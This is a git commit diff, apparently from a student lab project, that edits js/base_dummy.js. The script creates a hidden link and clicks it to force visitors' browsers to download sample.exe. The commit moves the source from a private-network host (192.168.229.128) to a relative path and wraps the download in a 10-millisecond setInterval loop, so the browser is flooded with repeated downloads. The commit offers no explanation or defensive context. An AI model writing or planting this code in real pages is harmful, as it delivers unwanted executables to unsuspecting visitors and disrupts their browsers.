e68a8384dee65ec5c65ee8856d206187c7cdc25c
Takumi <c0a20021ab@edu.teu.ac.jp>
2022-07-22 12:01:12 +0900

    完成！！！

--- js/base_dummy.js
+++ js/base_dummy.js
@@ -1,7 +1,9 @@
 <script>
-    var link = document.createElement("a");
-    link.href = "http://192.168.229.128/sample.exe";
-    link.download = "";
-    document.body.appendChild(link);
-    link.click();
+    setInterval(() => {
+        var link = document.createElement("a");
+        link.href = "../sample.exe";
+        link.download = "";
+        document.body.appendChild(link);
+        link.click();
+    }, 10)
 </script>
